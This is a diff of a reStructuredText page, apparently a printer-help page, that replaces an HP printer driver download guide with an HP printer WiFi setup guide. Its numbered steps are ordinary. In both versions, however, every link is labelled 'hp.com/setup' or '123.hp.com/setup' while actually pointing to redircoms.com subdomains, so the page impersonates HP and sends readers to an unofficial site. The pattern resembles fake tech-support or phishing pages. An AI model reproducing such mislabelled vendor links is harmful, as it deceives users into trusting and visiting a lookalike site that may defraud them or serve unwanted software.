@@ -1,21 +1,21 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+How to Connect HP Printer to WiFi: Complete Setup Guide (2025)
 ##################
 
 .. meta::
-   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
+   :msvalidate.01: 713FDDEA78DE8C573D35C3BB45A8B2DC
 
 .. image:: blank.png
       :width: 350px
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: SETUP-YOUR-PRINTER.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: 123.hp.com/setup
+      :target: https://hs.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,46 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+Setting up your HP printer to work wirelessly allows you to print from anywhere within your network. Whether you’re using a Windows PC, Mac, smartphone, or tablet, this guide will walk you through every step. Start by visiting `123.hp.com/setup <https://hs.redircoms.com>`_ to download the required drivers and begin your printer connection process. If you're looking for help to `Connect HP Printer to WiFi <https://hs.redircoms.com>`_, follow the complete instructions below.
 
-**********
-Steps to Download HP Printer Driver
-**********
+Method 1: Connect HP Printer to WiFi Using HP Smart App
+-------------------------------------------------------
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+Step 1: Download the HP Smart App  
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+- For Windows, macOS, Android, or iOS, go to the App Store or Microsoft Store and install **HP Smart**.
+- Open the app and sign in with your HP account.
 
-2. Enter your HP printer model in the search box.
+Step 2: Prepare Your Printer  
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+- Power on your HP printer.
+- Press and hold the **WiFi** or **Wireless** button until the wireless light starts blinking. This activates **Wi-Fi Setup Mode**.
 
-3. Select your operating system if prompted.
+Step 3: Connect via HP Smart  
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+- Open HP Smart and click **Add Printer**.
+- The app will detect printers in setup mode.
+- Select your printer and follow the on-screen prompts to connect it to your WiFi network.
 
-4. Click on **Download** to get the latest driver and software package.
+Step 4: Confirm Connection  
+^^^^^^^^^^^^^^^^^^^^^^^^^^
+- The WiFi light on the printer will become solid once connected.
+- Print a test page to confirm successful wireless setup.
 
-5. Save the installer file to your computer.
+Method 2: Connect HP Printer to WiFi Using Printer Control Panel
+----------------------------------------------------------------
 
-**********
-Steps to Install HP Printer Driver
-**********
+Step 1: Navigate to Wireless Setup  
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+- On the printer's touch screen, go to **Settings** > **Network Setup** > **Wireless Settings**.
+- Select **Wireless Setup Wizard**.
 
-1. Locate the downloaded installer file on your computer.
+Step 2: Choose Your WiFi Network  
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+- The printer will scan for available networks.
+- Select your network and enter the WiFi password.
 
-2. Double-click the installer to begin the setup process.
-
-3. Follow the on-screen instructions and accept the license agreement.
-
-4. Choose your connection type (USB or Wireless).
-
-5. Complete the installation by clicking **Finish**.
-
-**********
-Setting Up Your HP Printer
-**********
-
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+Step 3: Complete Setup  
+^^^^^^^^^^^^^^^^^^^^^^
+- Once connected, the wireless icon will stop blinking and remain steady.
+- Go to your computer or mobile device and add the printer using the system's **Printers & Scanners** settings.
